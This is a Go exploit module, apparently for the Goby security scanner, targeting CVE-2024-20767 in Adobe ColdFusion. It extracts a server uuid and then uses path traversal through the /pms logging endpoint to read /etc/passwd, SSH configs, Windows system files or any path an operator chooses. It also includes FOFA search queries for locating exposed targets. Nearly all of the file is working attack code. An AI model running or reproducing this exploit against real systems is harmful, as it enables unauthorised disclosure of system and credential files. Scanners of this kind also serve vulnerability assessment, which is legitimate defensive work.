package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Adobe ColdFusion /CFIDE/adminapi/_servermanager/servermanager.cfc File Read Vulnerability (CVE-2024-20767)",
    "Description": "<p>Adobe ColdFusion is a commercial application server developed by Adobe for web application development. The vulnerability allows an attacker to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure web site.</p>",
    "Product": "Adobe-ColdFusion",
    "Homepage": "https://www.adobe.com/",
    "DisclosureDate": "2024-03-26",
    "PostTime": "2024-03-28",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"/cfajax/\" || header=\"CFTOKEN\" || banner=\"CFTOKEN\" || body=\"ColdFusion.Ajax\" || body=\"<cfscript>\" || server=\"ColdFusion\" || title=\"ColdFusion\" || (body=\"crossdomain.xml\" && body=\"CFIDE\") || (body=\"#000808\" && body=\"#e7e7e7\")",
    "GobyQuery": "body=\"/cfajax/\" || header=\"CFTOKEN\" || banner=\"CFTOKEN\" || body=\"ColdFusion.Ajax\" || body=\"<cfscript>\" || server=\"ColdFusion\" || title=\"ColdFusion\" || (body=\"crossdomain.xml\" && body=\"CFIDE\") || (body=\"#000808\" && body=\"#e7e7e7\")",
    "Level": "2",
    "Impact": "<p>The vulnerability allows an attacker to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure web site.</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"https://www.adobe.com/\">https://www.adobe.com/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
    "References": [
        "https://helpx.adobe.com/security/products/coldfusion/apsb24-14.html",
        "https://jeva.cc/2973.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom,windows,linux",
            "show": ""
        },
        {
            "name": "windows",
            "type": "select",
            "value": "host,license.rtf",
            "show": "attackType=windows"
        },
        {
            "name": "linux",
            "type": "select",
            "value": "passwd,ssh_config,proc_mounts",
            "show": "attackType=linux"
        },
        {
            "name": "content",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uuid",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "burpsuite",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-20767"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "Adobe ColdFusion /CFIDE/adminapi/_servermanager/servermanager.cfc 文件读取漏洞 (CVE-2024-20767)",
            "Product": "Adobe-ColdFusion",
            "Description": "<p>Adobe ColdFusion 是 Adobe 公司开发的用于 Web 应用程序开发的商业应用程序服务器。攻击者可通过该漏洞读取系统重要⽂件（如数据库配置⽂件、系统配置⽂件）、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.adobe.com/\" target=\"_blank\">https://www.adobe.com/</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">攻击者可通过该漏洞读取系统重要⽂件（如数据库配置⽂件、系统配置⽂件）、数据库配置⽂件等等，导致⽹站处于极度不安全状态。</span><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Adobe ColdFusion /CFIDE/adminapi/_servermanager/servermanager.cfc File Read Vulnerability (CVE-2024-20767)",
            "Product": "Adobe-ColdFusion",
            "Description": "<p>Adobe ColdFusion is a commercial application server developed by Adobe for web application development. The vulnerability allows an attacker to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure web site.<br></p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"https://www.adobe.com/\" target=\"_blank\">https://www.adobe.com/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
            "Impact": "<p>The vulnerability allows an attacker to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure web site.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10937"
}`
	getServeruuidpolite := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		// 对于同名的文件只能上传一次,否则会被更改文件名，且有的系统可以上传，但对存在文件夹路径做了鉴权处理，访问需要权限,有的有防火墙，需要做免杀，故文件上传 payload 均做了免杀。POC检测的为成功上传且可以访问的
		getUuidConfig := httpclient.NewGetRequestConfig("/CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat")
		getUuidConfig.VerifyTls = false
		getUuidConfig.FollowRedirect = false
		getUuidConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36")
		getUuidConfig.Header.Store("Accept-Encoding", "gzip, deflate, br")
		getUuidConfig.Header.Store("Connection", "close")
		if resp, err := httpclient.DoHttpRequest(hostInfo, getUuidConfig); resp != nil && resp.StatusCode == 200 {
			return resp, nil
		} else if err != nil {
			return nil, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	readServerfilepolite := func(hostInfo *httpclient.FixUrl, uuid string, filename string) (*httpclient.HttpResponse, error) {
		readServerConfig := httpclient.NewGetRequestConfig("/pms?module=logging&file_name=../../../../../../.." + filename + "&number_of_lines=10000")
		readServerConfig.VerifyTls = false
		readServerConfig.FollowRedirect = false
		readServerConfig.Header.Store(`uuid`, uuid)
		readServerConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36")
		readServerConfig.Header.Store("Accept-Encoding", "gzip, deflate, br")
		readServerConfig.Header.Store("Connection", "close")
		if resp, err := httpclient.DoHttpRequest(hostInfo, readServerConfig); resp != nil && resp.StatusCode == 200 {
			return resp, nil
		} else if err != nil {
			return nil, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			if resp, _ := getServeruuidpolite(hostInfo); resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "uuid") {
				reg := regexp.MustCompile(`<var name='uuid'><string>(.*?)</string>`).FindString(resp.RawBody)
				cookies := strings.TrimLeft(strings.TrimRight(reg, "</string>"), "<var name='uuid'><string>")
				if filename1, _ := readServerfilepolite(hostInfo, cookies, "/etc/passwd"); filename1 != nil && filename1.StatusCode == 200 && strings.Contains(filename1.RawBody, "/sbin") {
					ss.VulURL = hostInfo.FixedHostInfo + "/CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat"
					return true
				} else if filename2, _ := readServerfilepolite(hostInfo, cookies, "/Windows/win.ini"); filename2 != nil && filename2.StatusCode == 200 && strings.Contains(filename2.RawBody, "extensions") {
					ss.VulURL = hostInfo.FixedHostInfo + "/CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat"
					return true
				} else {
					return false
				}
			} else {
				return false
			}
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" {
				content := goutils.B2S(ss.Params["content"])
				resp, _ := getServeruuidpolite(expResult.HostInfo)
				reg := regexp.MustCompile(`<var name='uuid'><string>(.*?)</string>`).FindString(resp.RawBody)
				cookies := strings.TrimLeft(strings.TrimRight(reg, "</string>"), "<var name='uuid'><string>")
				if filename1, _ := readServerfilepolite(expResult.HostInfo, cookies, content); filename1 != nil && filename1.StatusCode == 200 && strings.Contains(filename1.RawBody, "/sbin") {
					expResult.Success = true
					expResult.Output = filename1.RawBody
				} else {
					expResult.Success = false
					expResult.Output = "读取失败"
				}
			} else if attacktype == "windows" {
				readtype := goutils.B2S(ss.Params["windows"])
				content := ""
				if readtype == "host" {
					content = "/windows/system32/drivers/etc/hosts"
				} else if readtype == "license.rtf" {
					content = "/windows/system32/license.rtf"
				} else {
					expResult.Success = false
					expResult.Output = "未知的利用方式"
					return expResult
				}
				resp, _ := getServeruuidpolite(expResult.HostInfo)
				reg := regexp.MustCompile(`<var name='uuid'><string>(.*?)</string>`).FindString(resp.RawBody)
				cookies := strings.TrimLeft(strings.TrimRight(reg, "</string>"), "<var name='uuid'><string>")
				if filename1, _ := readServerfilepolite(expResult.HostInfo, cookies, content); filename1 != nil && filename1.StatusCode == 200 && strings.Contains(filename1.RawBody, "[") {
					expResult.Success = true
					expResult.Output = filename1.RawBody
				} else {
					expResult.Success = false
					expResult.Output = "读取失败"
				}
			} else if attacktype == "linux" {
				readtype := goutils.B2S(ss.Params["linux"])
				content := ""
				if readtype == "ssh_config" {
					content = "/etc/ssh/ssh_config"
				} else if readtype == "proc_mounts" {
					content = "/proc/mounts"
				} else if readtype == "passwd" {
					content = "/etc/passwd"
				} else {
					expResult.Success = false
					expResult.Output = "未知的利用方式"
					return expResult
				}
				resp, _ := getServeruuidpolite(expResult.HostInfo)
				reg := regexp.MustCompile(`<var name='uuid'><string>(.*?)</string>`).FindString(resp.RawBody)
				cookies := strings.TrimLeft(strings.TrimRight(reg, "</string>"), "<var name='uuid'><string>")
				if filename1, _ := readServerfilepolite(expResult.HostInfo, cookies, content); filename1 != nil && filename1.StatusCode == 200 && strings.Contains(filename1.RawBody, "[") {
					expResult.Success = true
					expResult.Output = filename1.RawBody
				} else {
					expResult.Success = false
					expResult.Output = "读取失败"
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
